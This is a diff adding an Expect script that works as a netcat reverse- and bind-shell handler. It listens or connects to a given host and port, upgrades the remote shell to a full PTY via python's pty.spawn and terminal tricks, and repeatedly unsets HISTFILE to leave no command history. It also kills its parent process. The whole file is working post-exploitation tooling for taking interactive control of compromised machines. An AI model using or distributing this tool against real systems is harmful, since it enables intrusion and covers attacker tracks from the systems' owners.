@@ -1,0 +1,126 @@
+#!/usr/bin/expect
+
+lassign $argv arg1 arg2 arg3 arg4
+
+if { $arg1 != "" && $arg2 != "" } {
+
+	if { $arg1 == "-l" } {
+		if { $arg3 == "" } {
+			set ADDR "0.0.0.0"
+			set PORT $arg2
+			set CMD "(nc -lvp $PORT; echo -e '\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3')"
+		} else {
+			set ADDR $arg2
+			set PORT $arg3
+			set CMD "(nc -lvp $PORT -s $ADDR; echo -e '\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3')"
+		}
+		set MSG "\[\033\[94m*\033\[0m\] Waiting for connections on $ADDR:$PORT"
+		set EXP "onnect"
+	} else {
+		set ADDR $arg1
+		set PORT $arg2
+		#set CMD "(nc -v $ADDR $PORT; echo -e '\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3')"
+		set CMD "($arg3 nc -v $ADDR $PORT; echo -e '\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3')"
+		set MSG "\[\033\[94m*\033\[0m\] Connecting to $ADDR:$PORT"
+		set EXP "open"
+	}
+
+	log_user 0
+	set timeout -1
+
+	spawn /bin/bash
+	send "$CMD\n"
+	puts $MSG
+
+	expect {
+		$EXP {
+			puts "\[\033\[92m+\033\[0m\] Connected"
+			sleep 0.2
+			send "unset HISTFILE\n"
+			send "p=`which python python2 python3 python2.7 python3.5 python2.6 python3.4 python3.6 | xargs | cut -d ' ' -f 1`;if \[ ! -z \$p \]; then echo 'P''YTHON-OK'; \$p -c 'import pty;pty.spawn(\"/bin/bash\")'; else echo 'P''YTHON-ERR'; fi\n"
+			expect {
+				"PYTHON-OK" {
+					set ROWS [exec tput lines]
+					set COLS [exec tput cols]
+					puts "\[\033\[92m+\033\[0m\] Python found"
+					expect {
+						":" {
+						}
+						"bash" {
+						}
+					}
+					send \x1A
+					puts "\[\033\[94m*\033\[0m\] Setting terminal"
+					expect ":"
+					send "stty raw -echo\n"
+					send "fg; echo -e '\xe4\xe3\xe4\xe4\xe3\xe4'\n"
+					expect {
+						":" {
+						}
+						"bash" {
+						}
+					}
+					send "kill -s 9 `ps -fp \$PPID | awk \"/\$PPID/\"' { print \$3 } '`\n"
+					send "reset\n"
+					expect {
+						":" {
+						}
+						"bash" {
+						}
+					}
+					send "id\n"
+					expect {
+						"Terminal type?" {
+							send "xterm-256color\n"
+						}
+						"uid=" {
+						}
+					}
+					send "stty rows $ROWS columns $COLS\n"
+					send "export SHELL=bash\n"
+					send "export TERM=xterm-256color\n"
+					send "unset HISTFILE\n"
+					send "clear\n"
+					#send "uname -a; id\n"
+					sleep 0.5
+					interact -o "\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\n\xe4\xe3\xe4\xe4\xe3\xe4\n" return
+				}
+				"PYTHON-ERR" {
+					puts "\[\033\[91m-\033\[0m\] Python not found"
+					puts "\[\033\[92m+\033\[0m\] Interacting"
+					send "uname -a; id\n"
+					interact -o "\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3" return
+				}
+			}
+			puts ""
+			puts "\[\033\[94m*\033\[0m\] Terminated"
+		}
+		"Connection refused" {
+			puts "\[\033\[91m-\033\[0m\] Connection refused"
+		}
+		"Permission denied" {
+			puts "\[\033\[91m-\033\[0m\] Permission denied"
+		}
+		"forward host lookup failed" {
+			puts "\[\033\[91m-\033\[0m\] Forward host lookup failed"
+		}
+		"Cannot assign requested address" {
+			puts "\[\033\[91m-\033\[0m\] Cannot assign requested address"
+		}
+		"invalid port" {
+			puts "\[\033\[91m-\033\[0m\] Invalid port"
+		}
+		"invalid local port" {
+			puts "\[\033\[91m-\033\[0m\] Invalid local port"
+		}
+		"Address already in use" {
+			puts "\[\033\[91m-\033\[0m\] Address already in use"
+		}
+		"*** buffer overflow detected ***" {
+			puts "\[\033\[91m-\033\[0m\] *** buffer overflow detected ***"
+		}
+	}
+	exit
+} else {
+	puts "Usage: $::argv0 \[-l\] \[addr\] port"
+}
